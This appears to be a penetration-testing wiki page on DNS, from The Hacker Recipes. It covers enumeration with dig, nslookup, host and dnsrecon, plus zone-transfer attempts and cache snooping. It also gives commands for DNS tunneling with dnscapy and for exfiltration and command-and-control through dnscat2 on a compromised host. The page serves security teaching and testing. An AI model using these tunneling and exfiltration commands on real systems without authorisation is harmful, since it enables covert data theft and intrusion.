---
authors: ShutdownRepo, Tednoob17
category: infra
---

# 🛠️ DNS

## Theory

The Domain Name System (DNS) is a fundamental protocol of the Internet that translates human-readable domain names into IP addresses. It functions as a distributed database system that enables computers to resolve domain names to the corresponding network addresses required for network communication.

DNS operates on port 53 by default and uses both TCP and UDP protocols. The system is hierarchical, with root servers at the top, followed by Top-Level Domain (TLD) servers, and authoritative name servers for specific domains.

## Practice

### Enumeration

DNS enumeration involves gathering information about a domain's DNS infrastructure. This can be accomplished through various methods and tools.

#### DNS Queries

:::tabs

=== dig
The dig utility performs DNS lookups and displays responses from name servers.

```bash
# Query A records (IP addresses)
dig thehacker.recipes A

# Query name server records
dig thehacker.recipes NS

# Trace DNS resolution path
dig thehacker.recipes +trace
```

=== nslookup
nslookup provides DNS query functionality and debugging capabilities.

```bash
# Standard DNS query
nslookup thehacker.recipes

# Query mail exchange records
nslookup -type=MX thehacker.recipes

# Query specific DNS server
nslookup thehacker.recipes $DNS_IP
```

=== host
host performs DNS lookups with a simplified interface.

```bash
# Basic DNS query
host thehacker.recipes

# Query mail exchange records
host -t MX thehacker.recipes

# Reverse DNS lookup
host $IP_ADDRESS
```

=== whois
whois retrieves registration information for domains.

```bash
# Domain registration lookup
whois thehacker.recipes
```
:::

#### Zone Transfers
Zone transfers (AXFR requests) are a DNS protocol feature that allows a secondary DNS server to receive all DNS records from a primary DNS server. While legitimate for DNS replication, misconfigured servers allowing unauthorized zone transfers can expose complete domain information to potential attackers.

Common signs of misconfiguration include:
- Allowing zone transfers from any source IP
- Missing ACLs for AXFR requests
- Exposed internal DNS records

```bash
# Basic zone transfer attempt
dig axfr @$DNS_IP $DOMAIN

# Zone transfer specifying name server
dig axfr $DOMAIN @ns1.$DOMAIN

# Using host command for zone transfer
host -t axfr $DOMAIN $DNS_IP

# Alternative using fierce for zone transfers
fierce --domain $DOMAIN --dns-servers $DNS_IP
```

> [!NOTE]
> Modern DNS servers typically restrict zone transfers by default. Success usually indicates a misconfiguration.

#### Subdomain Enumeration
DNSRecon enables comprehensive DNS reconnaissance, including subdomain discovery and record analysis.

```bash
# Basic domain enumeration
dnsrecon -d example.com

# Brute force with wordlist
dnsrecon -d example.com -D $WORDLIST -t std --xml $OUTPUT.xml
```

### Attacks

#### DNS Tunneling
DNS tunneling exploits DNS protocol for data exfiltration or command and control communication. While legitimate uses exist (e.g., software updates), the technique is often employed maliciously.

```bash
# Server configuration
sudo python dnscapy_server.py $DELEGATED_ZONE_NAME $EXTERNAL_IP_ADDR

# Client configuration
ssh -o ProxyCommand="sudo python dnscapy_client.py $DELEGATED_ZONE_NAME $IP_ADDR_OF_CLIENT_DNS" yourlogin@localhost
```

#### DNS Cache Snooping
Cache snooping enables examination of a DNS server's cache to determine recently queried domains.

```bash
# Perform cache snooping
dig @$DNS-SERVER $DOMAIN +norecurse
```

### Post-Exploitation

#### DNS Exfiltration
DNS exfiltration leverages DNS queries to extract data from compromised systems. dnscat2 provides encrypted command-and-control capabilities over DNS.

```bash
# Server setup
dnscat2 --dns server=$DNS_SERVER_IP:53

# Client connection
dnscat2 $DOMAIN
```

## Resources

* [HTB Academy - Information Gathering-Web Edition](https://academy.hackthebox.com/module/144/section/1251)
* [Kali Tools - DNSRecon Documentation](https://www.kali.org/tools/dnsrecon)
* [Common DNS Attack Types](https://bluecatnetworks.com/blog/four-major-dns-attack-types-and-how-to-mitigate-them)
* [DNS Tunneling Techniques](https://www.blackhat.com/presentations/bh-usa-08/Miller/BH_US_08_Ty_Miller_Reverse_DNS_Tunneling_Shellcode.pdf)